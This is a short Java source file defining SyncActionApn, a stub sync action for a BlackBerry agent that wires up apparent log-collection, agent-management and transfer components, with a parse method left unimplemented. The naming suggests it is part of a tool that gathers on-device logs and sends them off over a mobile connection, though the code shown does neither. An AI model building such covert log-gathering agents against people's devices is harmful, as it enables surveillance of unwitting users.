package blackberry.action;

import blackberry.AgentManager;
import blackberry.event.Event;
import blackberry.log.LogCollector;
import blackberry.transfer.Transfer;
import blackberry.utils.Check;

public class SyncActionApn extends SyncAction {

    public SyncActionApn(final int actionId_, final byte[] confParams) {
        super(actionId_);
        parse(confParams);

        // #ifdef DBC
        Check.requires(actionId == ACTION_SYNC, "ActionId scorretto");
        // #endif

        logCollector = LogCollector.getInstance();
        agentManager = AgentManager.getInstance();
        transfer = Transfer.getInstance();
    }
    
    protected SyncActionApn(int actionId) {
        super(actionId);        
    }


    protected boolean parse(byte[] confParams) {
        // TODO Auto-generated method stub
        return false;
    }

}
